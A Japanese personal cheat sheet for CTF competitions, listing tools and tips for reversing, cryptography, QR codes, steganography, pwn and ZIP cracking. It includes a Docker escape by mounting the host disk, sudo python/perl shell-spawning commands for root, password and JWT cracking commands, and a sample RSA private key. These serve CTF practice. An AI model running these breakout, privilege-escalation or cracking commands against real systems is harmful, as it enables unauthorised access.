# CTFメモ

# 環境構築

```bash
sudo apt install -y open-vm-tools-desktop
reboot
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y
python3 -m pip install --upgrade pip
sudo -H python3 -m pip install --upgrade pwntools
git clone https://gist.github.com/leonjza/f35a7252babdf77c8421
sudo apt install -y libimage-exiftool-perl
wget http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/pkcrack-1.2.2.tar.gz
tar xzvf pkcrack-1.2.2.tar.gz
cd pkcrack-1.2.2/src
make
cd ~
git clone https://github.com/waidotto/strong-qr-decoder
```


# Docker
### 今いる環境がDockerコンテナかどうかの確認
cat /proc/1/cgroup
↑を実行してDockerという文字列があればDocker

### コンテナからの脱獄
root権限があれば
fdisk -l
で存在するパーティションを確認して
mount /dev/sda\[ここはfdisk -lで取得したパーティション名\] /mnt
でマウントすることでホスト側のファイルにアクセス可能

その他参考
https://tbhaxor.com/container-breakout-part-1/
https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/
https://container-security.dev/security/breakout-to-host.html

# リバーシング

### チェックリスト

```
Note:
This challenge is quite hard for beginner. This checklist is not fully cover all things in RE and it will not applicable if you don't have the foundation to play with reverse engineering. 
Whenever you get a file, issuing file  command first to it to know what really file is it.
Use strings <filename> command to read the strings in the binary to find some clues. Maybe some grep -i command too.
You need to strong in C, Assembly Language and computer architecture for this challenge!
Usually they gave a binary file. Weather it a...
PE File (.exe or .dll)
ELF File (elf)
APK File (apk)
.NET File (exe)
Java file
Python File (pyc or py)
PE File
Use DIE, PEID, PEBear, or PEView software to do static file analysis. Find details of file in there!
Use HxD to check the header file, file signature. Maybe the corrupt file sign one.
Find it whether it packed or not. Find online unpack.
Find it whether the binary has anti-debug or not.
Use IDA Pro software to perform static analysis on the binary.
When do analysis static or dynamic focus on strcmp, function call, conditional jump.
You can use Snowman or Ghidra software  to perform decompiler.
Use debugger like Immunity Debugger, x64Dbg/x32Dbg, or WinDbg to debug the binary.    
ELF
Use ltrace ./<filename> command to know what library function are being called in the binary.
Use strace ./<filename> command to know what system and signal function are being called in the binary.
Use nm <filename> command to know what symbol being called in the binary.
Use readelf -a <filename>  command. It will displays information about ELF files.
Use Gdb debugger extension. Peda, pwndbg or gef will help you!.
Or you can use edb debugger.
Use IDA Pro software to perform static analysis on the binary.
APK File
Use APKTool <filename> command tools.
Use Android Emulator to run the program.
Use Android Debug Bridge.
Use dex2jar <filename> command tools.
Use jd-gui. 
JADX is good alternative to jd-gui.
Rename the file to zip file. Unzip it. Take a look the file in your favorite text editor.
.Net File
Use dnSpy software. Very powerful. You can compile the program by
Edit in the main interface -> compile -> save all. Try run the program back!
Java file
Use JADX
Python file
There are many options, one of it is uncompyle6. Just g
```

### any.run
https://any.run/
オンラインのサンドボックス。マルウェア実行時の通信先とかプロセスの起動とかを表示してくれる


### fakenet-ng
マルウェアの通信を動的に解析したいときに使う。
exeを起動させるとすべての通信がfakenetにとられるようになるので動かす。
動かしている間は外のネットワークに通信がいかないようにできている。

### noriben
サンドボックス系のツール。
起動条件として同ディレクトリにprocmon.exeが必要。
起動するとプロンプトとProcess monitorが立ち上がるので「When runtime is complete, press CTRL+C to stop logging.」が出たら解析対象のプログラムを実行する。
プロセス起動のタイムラインなども同時に出力される。


### Ghidra

リバーシングツール
参考URL
https://www.bioerrorlog.work/entry/ghidra-beginner

起動するまで時間がかかるので注意
起動したらプロジェクトを作成して、作成したプロジェクトにファイルを入れる。
インポートが終わったらファイル名をダブルクリックでデコンパイル画面になる
左のSymbolTreeのImportsのところに使っている関数が入る。
「get～」系が入力された文字を取得したりするので探してダブルクリック
真ん中のListingが関数に変わるので、右クリックして一番下のReferences->Show Call Treesを選ぶ
下のFunction Call Treesのところにその関数を呼び出している所が表示されるのでいいところを選んでダブルクリックする。
真ん中のListingウィンドウが呼び出しているところに変わって右のDecompileウィンドウにも表示がされる。
数値はhexで見づらい場合はListingウィンドウの値のところで右クリックしてCONVERT > SIGNED DECIMALをすると1進になる

### IDA free

リバーシングツール
表のビューでh変数をクリックしてRを押すと変数をアスキーにできる。リトルエンディアンになっている
分岐の先で右クリックSETIPでそっちに行くようにできる

### Binary Ninja

リバーシングツール
File->open で解析したいファイルを読み込ませて下のLinerをLiner　Disassemblyにすると動きが見える。
入力を求めているメッセージあたりを検索して、そのあたりで作っている文字列を見るといいかも。
hexからの変換はCyberchefでできる。

### dex2jar

dexファイルをjarに変換する
https://qiita.com/sirone/items/9a856035d855b832e2aa

### jd-gui

Javaの実行体(.jar)からソースコードを生成するデコンパイラ
参考URL
https://qiita.com/niwasawa/items/d89e7cef0c749c6afea6

### Androidアプリ(.apk)をリバーシング

1. apkファイル⇒zipファイルへ拡張子を変更
2. zipファイルを展開
3. 展開したファイル内の「class.dex」ファイルを、dex2jarのバッチファイルを用いて、jarファイルへ変換
4. jarファイルを「 jd-gui」を用いて、逆コンパイルを行う。
   参考
   https://ikumi-1.com/2019/03/20/post-512/
   https://qiita.com/Hiroya_W/items/91079b043f86d2c77517#%E3%81%8A%E8%8C%B6%E3%82%92%E3%81%95%E3%81%90%E3%82%8C

### OllyDbg

デバッガ
参考URL
 https://kira000.hatenadiary.jp/entry/2014/04/12/022801 

### x64dbg

デバッガ

### PPEE

PE解析ツール
参考URL
 https://qiita.com/harapeco_nya/items/6ae22d94dd66a04f6b1d 

### detect it easy

PE情報等解析ツール
パッキングの有無の判別等
参考URL
 https://forest.watch.impress.co.jp/docs/review/752838.html 

### CFF Explorer

PE解析ツール

### pedump

PE情報等解析ツール

``` bash
sudo gem install pedump
pedump a.exe
```

### UPX

パッカー(アンパックもできる)

``` bash & cmd
 upx [filepath] # -d オプションでアンパック
```

### Pestadio

exeファイルの表層解析用ツール

https://www.winitor.com/



### ltrace

 https://qiita.com/hana_shin/items/0a6126e1c8daa950e782 

### strace

 https://tech-lab.sios.jp/archives/17394 

### dnSpy

C#用のデコンパイラ。C#と判別する方法としてはfileコマンドで調べた際に「.net～」と書いてあればC#の可能性がある。
 http://www.ujp.jp/modules/tech_regist2/?SecurityTool%2Fdecompiler%2FdnSpyV6.1 
 https://hakase0274.hatenablog.com/entry/2019/09/11/222621 

### notepad++

テキストエディタ
バッチファイルの変数名を色を変えて表示してくれる

### hexedit
linuxコンソールで使えるバイナリエディタ
```
sudo apt install hexedit
hexedit [filename]
```

### uncompyle2
pythonコードからコンパイルされて作成された実行ファイル(pyc)をpythonコードに戻すツール。
``` bash
uncompyle2 -o [出力ディレクトリ] [戻すファイル]
```

### PEView
VisualStudioを使ってC#で作成されたプログラムの場合そのexeの中にデバッグ情報を格納するファイルへのパスが書き込まれる。
このツールで「SECTION .text」->IMAGE_DEBUG_TYPE_CODEVIEW」を見るかメモ帳で探すことができる。

### apkの解析
androidアプリとして出てくるapkファイルだが、javaとkotlinとDart(Flutter)がある。
javaならapkをzipにして解凍し、class.dexをデコンパイルすれば読めるようになる
Dart(Flutter)の場合はzipにして解凍し、apk/assets/flutter_assets/kernel_blob.binの中に入っているソース部分を探せば読める。
Flutterの場合はこのアイコンかも
![](https://i.imgur.com/kxs2kKJ.png)



# 暗号

``` チェックリスト
何が起こっても、グーグルはあなたの友達です。オンラインにはたくさんの暗号化ツールがあります。OpenSSLのように、優れたツールのいくつかはオフラインで作成されます。

クラシック暗号/シンプルデコーダーオンラインツール

https://quipqiup.com - quipqiupは、高速かつ自動化された暗号文のソルバーです

https://www.base64decode.org/ - base64でデコーダ

https://www.urldecoder.org/ - URLデコーダ

https://emn178.github.io/online-tools/base32_decode.html - Base32デコーダ

https://cryptii.com/ -オールインワンツールで

https://www.guballa.de/substitution-solver -置換ソルバー

https://www.guballa.de/vigenere-solver - Vigenereソルバー

https://rot13.com/ -腐朽1から25まで復号化

https://www.dcode.fr -オールインワンツールで

http://rumkin.com/tools/cipher/ -オールインワンツールで

http://www.unit-conversion.info/texttools/morse-code/ -モールスコードデコーダ

https://cryptii.com/pipes/ascii85-encoding - ASCII85デコーダ

現代の暗号

https://gchq.github.io/Cyber​​Chef/ -オールインワンツールで

https://crackstation.net/ -クラックの



Cryptool

ジョン・ザ・リッパー 

ハッシュキャット

圧縮ファイルのクラッキング

ジョン・ザ・リッパー- john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

fcrackzip- fcrackzip -D -u -p rockyou.txt  filename.zip

ハッシュキャット 

ノート：
時々、その特定の課題のためにあなた自身の復号化器を開発することを要求するいくつかの課題があります。課題を解決するための優れたスクリプト/プログラミング言語があることを確認してください。
```



### モールス信号

ツールを使って変換
 https://morsedecoder.com/ja/
 https://morse.ariafloat.com/en/

CyberChefでも復号できる。(From Morse)
 [https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line feed')) 

### ヴィジュネル暗号

キーを知らなくても推測してくれるサイト
https://www.guballa.de/vigenere-solver 

### ヴィジュネル暗号
アルファベットの所に複合に使用する表を入れてキーの所に複号キーを入れる
https://www.dcode.fr/en
![](https://i.imgur.com/o53DBBT.png)

### ヴィジュネル暗号

CTFとかFlagとかの文字列を見つけてくれる

``` python
# ヴィジュネル方陣生成アルゴリズム
def TableGen():
    table = []
    
    text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in range(26):
        table.append(text)
        text = text[1:] + text[0]
        
    return table

# 鍵生成アルゴリズム
def KeyGen():
    key = input("Key : ")
    return key

# 暗号化アルゴリズム
def Enc(plain, key, table):
    cipher = ""
    text_l = "abcdefghijklmnopqrstuvwxyz"
    text_u = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    # plain(msg)の要素分繰り返す。iには繰り返す文字数。pにはplainの１文字目が入る
    for i,p in enumerate(plain):
        if p in text_l :
            #keyのi文字目を取得してtext_uの何番目に格納されているか
            #plainのi文字目を取得してtext_lの何番目に格納しているか
            #を取得して方陣から暗号化する文字を取得して文字列に格納していく
            cipher += table[text_u.index(key[i % len(key)])][text_l.index(p)]
        else :
            cipher += p
    return cipher

# 復号アルゴリズム
def Dec(cipher, key, table):
    plain = ""
    text_l = "abcdefghijklmnopqrstuvwxyz"
    text_u = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    for i,c in enumerate(cipher):
        if c in text_u :
            plain += text_l[table[text_u.index(key[i % len(key)])].index(c)]
        else :
            plain += c
    return plain

# 解読アルゴリズム
def Attack(cipher):
    alphabet_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    # ここのfor文を増やすと鍵の長さを変えることができる
    for letter_1 in alphabet_upper:
        for letter_2 in alphabet_upper:
            for letter_3 in alphabet_upper:
                # 鍵の長さを変える場合、ここの変数を足す部分も増やす
                tmp_key = letter_1 + letter_2 + letter_3
                # 復号化処理
                tmp_plain = Dec(cipher, tmp_key, TableGen())
                #print(tmp_plain)
                # 復号化した文書に指定した文字列が含まれていれば候補として表示する
                if ("flag" in tmp_plain) or ("ctf" in tmp_plain) or ("ans" in tmp_plain):
                    print("Key might be {}".format(tmp_key))
                    print("Plaintext might be {}".format(tmp_plain[:100] + "..."))
                    print()

def main():
    print("[Usage] Enc: [a-z]->[A-Z]\tDec: [A-Z]->[a-z]")
    while True:
        mode = input("[E]nc [D]ec e[X]it [A]ttack : ")

        if mode == "X":
            return

        msg = input("Message : ")

        if mode == "E":
            print(Enc(msg, KeyGen(), TableGen()))
        elif mode == "D":
            print(Dec(msg, KeyGen(), TableGen()))
        elif mode == "A":
            Attack(msg)
        print()

# KEY、暗号文は大文字で、平文は小文字で入れること
main()

```

### RSACTFTool

``` bash
!git clone https://github.com/Ganapati/RsaCtfTool.git
!apt-get install libgmp-dev libmpc-dev
!pip install -r "RsaCtfTool/requirements.txt"
!RsaCtfTool/RsaCtfTool.py \
-n 314346410651148884346780415550080886403387714336281086088147022485674797846237037974025946383115524274834695323732173639559408484919557273975110018517586435379414584423 \
-e 66936921908603214280018123951718024245768729741801173248810116559480507532472797061229726239246069153844944427944092809221289396952390359710880636835981794334459051137 \
--uncipher 227982950403746746755552239763357058548502617805036635512868420433061892121830106966643649614593055827188324989309580260616202575703840597661315505385258421941843741681
```

### 換字式暗号

https://quipqiup.com/

### openssl

``` 
openssl rsautl -decrypt -in [暗号化されたファイル]  -out Desktop/flag -inkey [キーになるファイル]
```

キーになるファイルのサンプル

```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCwsV8+h+srxFdgeBxoYluS82DJd9/CvdDBz5rlc85vi/jRA7c/
zoHqETrA9MTjD/lZDyPqT36/MsZIo8eVQcQ8wSWVLNdM/3FJ1L6dUODaW8QKCDwV
3GtzrUC9L1z+Pc36b1vwb+PXKNjwE/G0FK2u0txcuLlYOJ99IdU8+y2mEQIDAQAB
AoGBAJ5JZ3+HF4AP1g7PyvMgGdUdPjl9r/CvRtI4/xRKmEaJaA8mewUoJG3hnXa6
T57x8nh7/bqsGGmEPOlZ/zOQxRADD+dSS3wQFDotVlKLE1EqGPp6aTUt9hMZugCo
hj61py+jYJRG3sKW//ToasTbTA7IPx385E8e1iUfsVnYcnuBAkEA1XCmCWgO2Tvw
heIJAIlsC3rrANAbadVqZ6mVz9C5/hNcE5U2ppabZlvRa7077Vm79XXB+adXBd74
acavcDWa+QJBANPs6VaUJdQpW0oh/Sz85h95ecfW7q/TtsqEa3aTYJ5Fn31gbpAW
qSwc8mNziqQ5QznZzAKjVlfsZKK/8gH40dkCQAZwTIHyIqiI91uCkxTyEFFUVuyC
WqFZr8kKw5suR74TZW6tzKU/29Y9pNakMb+aOmJQOBbI5oYl0MaYGMjAxTkCQCfH
2u0jlg5DTR2XT7z4JAJYfSGkGN3sce2F+d4iQAq1qwCP73Egr9TWAjHk6Gt3TEU5
uu/r1TNf7mwWd8ki+dECQBAeZGxZdklS3vgBiBGoa57ohpNDwnlhTEnwNUmntHDt
A9BeWg8xjnQ5EIccKF5Lif93TrXI9wQv8IxSyJ/vJGg=
-----END RSA PRIVATE KEY-----
```

### AES暗号（ECB）
128bit毎に区切って暗号化される。
ECBモードの場合、ブロックの中の文字が一緒なら同じ暗号文になるという脆弱性がある。
なので、128bitごと（16進だと32文字、平文だと16文字）に区切って考える


### jwt-cracker
jwtトークンの鍵を総当たりで解析するツール
```
#インストール
npm install --global jwt-cracker
#使い方(初回起動時に設定ファイルを書き出すので2回実行するといいかもしれない)
jwt-cracker <token> [<alphabet>] [<maxLength>]
#例
$ jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.keH6T3x1z7mmhKL1T3r9sQdAxxdzB6siemGMr_6ZOwU "123456" 6                   
SECRET FOUND: 123456
Time taken (sec): 2.604
Attempts: 54121

```

### Punycode

xn--q6j6gav1a0b2e1bh1ac2cl29ad7728kdjen6cz80dju6bqexchl9gel8b
みたいなやつ
https://punycode.jp/
で変換できる

### Diffie-Hellman
https://asecuritysite.com/encryption/diffie_py
上記のサイトでgに原子元、pに素数を入れる。
両方のSecretに入れる値が分かればいいが、公開情報しかわからない場合は端から入力して試していく。
Alice value (A): の値が公開情報の値になればその時のSecret値が正しい。
同じように Bob Secretも求める

### VBSの暗号（複合）化
VBScript encrypter and decrypter
https://master.ayra.ch/vbs/vbs.aspx

### 認証
#### basic
ユーザ名とパスワードを:で繋いでbase64にして送信する
例
cEgwdDA6YjBNYiE=　→　pH0t0:b0Mb!
以下のようにURLの先頭に付与することもできる
http://pH0t0:b0Mb!@photobomb.htb/printer


# QRコード

### PCで取り込み

 http://qrcode.red/ 

### QRコード以外も読み込める

 https://zxing.org/w/decode.jspx 

### strong-qr-decoder

破損したQRコードならこれで
要Python2.7
コマンドは

``` bash
python2.7 sqrd.py samples/1-c.txt
```
オプション
-e　エラー訂正レベル　2がHigh
-m　マスクパターン　0～7で指定する。総当たりする

``` sample
XXXXXXX__?????XX_X_XX_XXXXXXXX_____X_X?????X_XX__X_X_____XX_XXX_X_X?????XX___XX_X_XXX_XX_XXX_X_X?????__X_____X_XXX_XX_XXX_X_X?????____XX__X_XXX_XX_____X_X?????XX_XX___X_____XXXXXXXX_X_X_X_X_X_X_X_XXXXXXX_________?????_X_X__X________??X__?X?X?????XX_X__XX_XXXXX_??????????????_X_X__XXX__XXX_??????X???????XXXXX_X_X___X_X??????????????XXX_XXXX__XX___??????X???????XX_X_____XX__XX??????????????__XXX_X_X___X_X??????X???????_XX__XX_XXXX__X??????????????X_X__XX_____X__??????X???????__X___X_XX_X_X_??????????????X__XX___XX___X_??????X???????X___XX___X_XX_X??????????????XX__X_X__X_X_XX??????X???????__XXX_XXXXXX_XX________X?????XX_XXXX___XX___XXXXXXX_??????__XX__X_X_X_XXXX_____X_??????X_XX_XX___XX___X_XXX_X_??????____XXXXXXXXX_XX_XXX_X_??????_X_____X_X_XX__X_XXX_X_??????_X_X_XXXXXX__XXX_____X_??????XX_XXXX_X_XX__XXXXXXXX_??????_XX_X_X_XX_X_XX
```

```白紙
XXXXXXX_??????________XXXXXXXX_____X_??????________X_____XX_XXX_X_??????________X_XXX_XX_XXX_X_??????________X_XXX_XX_XXX_X_??????________X_XXX_XX_____X_??????________X_____XXXXXXXX_X_X_X_X_X_X_X_XXXXXXX________??????_______________??X__?X???????_______________??????_???????_______________??????X???????_______________??????_???????_______________??????X???????_______________??????_???????_______________??????X???????_______________??????_???????_______________??????X???????_______________??????_???????_______________??????X???????_______________??????_???????_______________??????X???????______XXXXX____________X?????______X___X____XXXXXXX_??????______X_X_X____X_____X_??????______X___X____X_XXX_X_??????______XXXXX____X_XXX_X_??????_______________X_XXX_X_??????_______________X_____X_??????_______________XXXXXXX_??????_______________
```

左上の形式情報は総当たり？

参考URL
 https://buuuuuuun3939.hatenablog.com/entry/2017/08/11/225400

https://www.slideshare.net/ssusera693ec/steganography-qr-code 

### QRコードをテキストに変換するpython
```python
#!/usr/bin/python
from PIL import Image

BLACK = 'X'
WHITE = '_'
UNKNOWN = '?'

quiet_zone_size = 16
cell_size = 4
unknown_cols = 18

img = Image.open('composition.png').convert('RGB')
w, h = img.size

qrtxt = ''
y = quiet_zone_size + cell_size - 1
while y < h - quiet_zone_size:
x = quiet_zone_size + cell_size - 1
while x < w - quiet_zone_size:
r, g, b = img.getpixel((x, y))
if x < quiet_zone_size + cell_size * unknown_cols:
qrtxt += UNKNOWN
elif r == 0 and g == 0 and b == 0:
qrtxt += BLACK
else:
qrtxt += WHITE
x += cell_size
qrtxt += '\n'
y += cell_size

with open('qr.txt', 'w') as f:
f.write(qrtxt)
```


### その他複数の種類のバーコードリーダー

https://online-barcode-reader.inliteresearch.com/

### electroharmonix
日本語に似せた文字だけど実は英語というもの。
対応表があるのでそれを見ながら解読する

# PDF

## pdfid

pdfファイルの中から悪意のあるPDFの特徴的な文字列を探すpython

``` python
pdfid 対象ファイル.pdf
```

オプションは以下を参考
http://ed3159.hatenablog.com/entry/pdf-analyzer-python-tools

製作者の解説。文字列の意味等が乗ってる
https://github.com/filipi86/MalwareAnalysis-in-PDF

### pdf-parser
pdfファイルのコメントやjavascriptなどを見ることができる

### PDF Stream Dumper
pdfファイルの解析を行う。
画面下の参照ボタンからファイルを選んでloadで読み込み。
pdfファイルに含まれているjavascriptなどのオブジェクトを確認できる。
javascriptを調べたければ上のメニューからJavascript_UIを選べばJavascriptの解析用の画面が出せる。
新しく出た画面でshellcodeの部分を選択して上のメニューからShellcode_Analysis->scDbgを選ぶとshellcodeを解析する画面が出せる。
出した画面でLaunchを押すとshellcodeが実行できる

# ターミナル

### rlogin

参考URL
 https://qiita.com/murachi1208/items/d6e4ce7ba75f1625fe51 

### Tera term

参考URL
 https://eng-entrance.com/teraterm-install 

### Python

pythonが使えるなら以下のコマンドでbashが起動できる。
sudoが使えるならrootになれる
sudo -lで使えるコマンドを一覧表示する

```bash
sudo python -c "import pty; pty.spawn('/bin/bash')" 
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Perl

perlが使えるなら以下のコマンドでbashが起動できる。
sudoが使えるならrootになれる
sudo -lで使えるコマンドを一覧表示する

``` bash
sudo perl -e 'exec "/bin/bash";'perl —e 'exec "/bin/sh";'
```

参考
https://guif.re/linuxeop
https://gtfobins.github.io/#+sudo

# エディタ

### サクラエディタ

参考URL
 https://qiita.com/mima_ita/items/1ca8b41e29329bb980d0
 CTRL＋Aで全選択した後にALT＋Aするとソートしてくれる
　CTRL＋Endでファイル末尾まで飛べる
### stirling

バイナリエディタ
参考URL
 https://kuronekohouse.com/Stirling-HowToUse 

### notepad++

テキストエディタ
バッチファイルの変数名を色を変えて表示してくれる

# ステガノ

### チェックリスト

```
全般的 通常、主催者が画像、音楽、ビデオ、Zip、EXE、ファイルシステム、PDF、その他のファイルを提供してくれた場合、それはステガノグラフィまたは法医学の課題です。最初にコマンドを実行します。fileメタデータは重要です。コマンドを使用して、ファイルのEXIFデータをチェックアウトします。exiftool [filename]ファイルで発行してみてください。ファイル内の別のファイルを非表示にする場合があります。binwalk [filename]抽出するには、を使用します。binwalk -e1つの特定のシグニチャタイプを抽出するには、を使用します。binwalk -D 'png image:png' [filename]すべてのファイルを抽出するには、を実行します。binwalk --dd='.*' [filename]  コマンドを使用してファイルカービングを試してください。何よりもまず、すべてのファイルをサポートします。foremost -v [filename]画像最初に画像を表示するそのファイルへのコマンドを使用します。stringsコマンド出力から試してください。grep -i [any strings you want to filter]stringsフラグ形式のみをフィルタリングする例。大文字と小文字を区別できないオプション。grep -i "flag{"-iGoogleの画像、差別化。同じ画像を見つけたが、md5ハッシュが異なる場合は、おそらく変更されている可能性があります。md5hash16進エディタを使用して、ヘッダーとファイルの内容を分析します。ファイルの署名を知っている。多分彼らは私たちに壊れたヘッダーを与えました！だからそれを修正してください！たぶん、ズームインとズームアウトの方法でフラグを取得できます。https://www.tineye.com/を使用して、インターネットで画像を逆検索します。コマンドツールを使用して画像操作を行います。imagemagickStegsolve.jarツールを使用します。私が参加したCTFは非常に多いため、このツールを使用して画像からフラグを再表示しました。を使用してファイルを切り分けます。自分でパスワードを見つけてみてください。たぶん、主催者がヒントを与えるか、パスワードが別のファイルにあるかもしれません。steghide --extract -sf <filename>コマンドを使用して、PNGファイルの破損を確認します。pngcheck <filename.png>PNGおよびBMPのステガノ隠しデータを。で検出します。issuing zsteg -a <filename.png>SmartDeblurソフトウェアを使用して、画像のぼやけを修正します。使用ファイル内のUNCOVER隠しデータへのツールステガノグラフィブルートフォースパスワードユーティリティ。stegcracker <filename> <wordlist>画像内のテキストをスキャンして.txtファイルに変換するために使用します。tesseract別のpowerfoolツールはと呼ばれます。zstegオンラインステガノデコーダーのいくつか：-https://futureboy.us/stegano/decinput.htmlhttp://stylesuxx.github.io/steganography/https://www.mobilefish.com/services/steganography/steganography.phphttps://manytools.org/hacker-tools/steganography-encode-text-into-image/https://steganosaur.us/dissertation/tools/imagehttps://georgeom.net/StegOnline圧縮ファイル解凍します。コマンドを使用して、Zipファイルの内部構造に関する詳細を表示します。zipdetails -vコマンドを使用して、Zipファイルに関する詳細情報を確認します。zipinfo破損したzipファイルの修復を試みてください。zip -FF input.zip --out output.zipBrute-を使用してzipパスワードを強制します fcrackzip -D -u -p rockyou.txt  filename.zip。7zをクラックするには実行します。それで7z2hashcat32-1.3.exe filename.7zjohn --wordlist=/usr/share/wordlists/rockyou.txt hash音楽ファイル最初に使用します。ファイルに何かが埋め込まれている可能性があります。binwalkAudacityを使用します。使用ソニックビジュアライザ。スペクトログラムと他のいくつかのペインを見てください。Deepsoundを使用します。SilentEyeを使用します。音楽用のオンラインステガノデコーダーのいくつか：-https://steganosaur.us/dissertation/tools/audio文章スパムテキストの非表示メッセージをデコードできるhttp://www.spammimic.com/を使用します。
```

https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography

### steghide

画像ファイルにファイルを埋め込んだり取り出したり
参考URL
 https://phantom37383.blog.fc2.com/blog-entry-806.html 

### Stegsolve

画像に最低ビット等で文字を埋め込む

### Stegosuite

Linux用のツール
画像ファイルからファイルの抽出ができる（GUI）

https://www.geeksforgeeks.org/image-steganography-using-stegosuite-in-linux/


### stepic

画像ファイルに文字やファイルを隠蔽できる

```
# apt-get -y install stepic[pass.txtをsample.jpgに隠蔽]# stepic --encode --image-in=sample.jpg --data-in=pass.txt --out=sample_after.jpg
```

### F5-steganography
https://github.com/matthewgao/F5-steganography

【flag.zip抽出手順】
　１．インストールしたF5-steganographyの中にある「d.bat」ファイル内に記されているファイル名を「HideAndSeek.jpg」に変更します。
　２．パスワードは「e.png」ファイル内を確認しても「PleasexxxxxxxFlag!」と伏せられており分かりませんが、「HideAndSeek.png」を開いて確認した文字列「PleaseFindTheFlag!」と前後の文字や伏せ文字数が同じであるため、この文字列がパスワードと推測し、「d.bat」を以下のように修正します。
 ３．「HideAndSeek.png」の拡張子を「png」→「jpg」に変更して、以下のコマンドを実行します。
 上記手順を実行すると、バッチファイルを実行したフォルダの配下に「out.txt」というファイルが見つかります。

### うさみみハリケーン

ステガノ用ツールビット等で埋め込まれた文字の探索などに
参考URL
 https://digitaltravesia.jp/usamimihurricane/webhelp/_RESOURCE/MenuItem/another/anotherAboutSteganography.html 

### Tineye

画像検索サイト。googleと併用する
 https://tineye.com/ 

### exiftool

exif情報の確認 [http://
sai.com/blog/2019/11/05/exiftool%E3%81%AA%E3%82%8B%E3%82%82%E3%81%AE%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%97%E3%81%A6%E3%81%BF%E3%81%9F-ubuntu%E7%B7%A8/](http://officesai.com/blog/2019/11/05/exiftoolなるものを設定してみた-ubuntu編/) 

### identify

画像ファイルの情報を確認
 https://qiita.com/ksugawara61/items/bb4727bc4f118aee2121 

### 画像ファイルの高さを修正する
バイナリエディタで編集すると画像の高さや幅を変更できる
以下はjpgの場合の表。これを見るとFFC0のあとにあるようなのでそこを書き換える
https://www.setsuki.com/hsp/ext/segment/sof0.htm
![](https://i.imgur.com/uNaKVSt.png)

### ImageMagick
よく使われる画像処理ソフト
脆弱性が多い
ファイル名や拡張子が入力可能なら拡張子を特定のものに変えると情報が取れる
txt　info　eps3

### PDFから画像を抽出

 https://qiita.com/aokomoriuta/items/066b760a28da461531b6 

### Strings
バイナリファイルから文字列を抽出する

### FLOSS
Stringsと似た感じで使えるツール。Windows用
難読化された文字列を自動的に検知してコードにしてくれるらしい
```
floss ファイル名で使える
```
### binwalk

中身に埋め込まれてるファイルがあるかなどを取り出すことが出来ます。
例えばただのPNGファイルかと思ったら、他にもJPEGなどファイルを幾つか連結している問題などが過去にありました。

``` 
$ sudo apt-get install binwalk$ binwalk -e stego_50.jpg
```

### foremost

これはファイルのヘッダやフッタ、内部データ構造に基づいてファイルを復元してくれるツールらしいです。
ただbinwalkみたいに一つのファイルに連結されてるときとかにも使えるっぽいです。

``` 
$ sudo apt-get install foremost$ foremost MrFusion.gpjb
```

### pngやgifを動画に
apngという形式があって複数のpngをつなげて動画にできる。
分割には
https://ezgif.com/split
を使う

### SSTV

スロースキャンテレビ
普通に再生するとピーとかの音しか聞こえてこないが、デコーダーを使用すると複合できる。
https://github.com/davidhoness/sstv_decoder

### 文字列でのステガノグラフィ

snowというツールを使うと空白の大量に入ったテキストの中にファイルを隠すことができる。
ただしパスが必要
https://sbmlabs.com/notes/snow_whitespace_steganography_tool/
https://www.ilovefreesoftware.com/01/windows/free-steganography-tool-to-hide-message-in-text-using-white-spaces.html

### 空白文字暗号

snowに似た感じの見た目だけど

https://www.dcode.fr/whitespace-language

### twitterの画像にファイルを埋め込む
ここのツールを使うとpng画像に他のファイルを埋め込める。
https://github.com/DavidBuchanan314/tweetable-polyglot-png
この方法で埋め込んだファイルはうさみみやCyberchefで取り出せる

# 画像系

### 細切れ画像の結合
``` python
#!/usr/bin/python
from PIL import Image

WH_LEN = 180
UNIT_SIZE = 4
IFILE_FORMAT = './pieces/%04d.png'#%04dは4桁表示にするということ

output_img = Image.new('RGB', (WH_LEN, WH_LEN), (255, 255, 255))

x = 0
y = 0
for i in range((WH_LEN / UNIT_SIZE) * (WH_LEN / UNIT_SIZE)):
filename = IFILE_FORMAT % (i + 1)
input_img = Image.open(filename).convert('RGB')
if x == WH_LEN / UNIT_SIZE:
x = 0
y += 1
output_img.paste(input_img, ((x * UNIT_SIZE), (y * UNIT_SIZE)))
x += 1

output_img.save('composition.png')
```


# Pwn

### メモリの中身を呼び出す

%pを大量に打ち込んでメモリを表示させる。
出てきたものをcyberchefでfromhexして文字列に変換。この時先頭に余計なものが入っていると表示がおかしくなる。
４文字づつリトルエンディアンになっているので並び替える
CyberchefのSwap endiannessを使うとよい（fromhex前ならHex、後ならRow）

```
C...IKFTsu{Trp_eftniroc_tcer}ylC...　IKFT　su{T　rp_e　ftni　roc_　tcer　}ylp...C
```



# ZIP

### pkcrack

既知平文攻撃用ツール
インストール

``` bash
#ブラウザでも可wget http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/pkcrack-1.2.2.tar.gztar xzvf pkcrack-1.2.2.tar.gzcd pkcrack-1.2.2/srcmakecd ..mv pkcrack-1.2.2 /home/kalicd ~
```

使い方
  pkcrackの使い方は、
　-C [暗号化されたzipファイル]
　-c [暗号化されたzipファイルの中で平文がわかるファイル]
　-P [平文のファイルが入っている暗号化されていないzip]
　-p [平文のファイル]
　-d [出力先（復号したzipファイルの名前）] 

``` bash
./pkcrack-1.2.2/src/pkcrack -C with_pass.zip -c logo01.png -P without_pass.zip -p logo01.png -d out.zip
```



### zipinfo

ZIPファイルの情報を表示
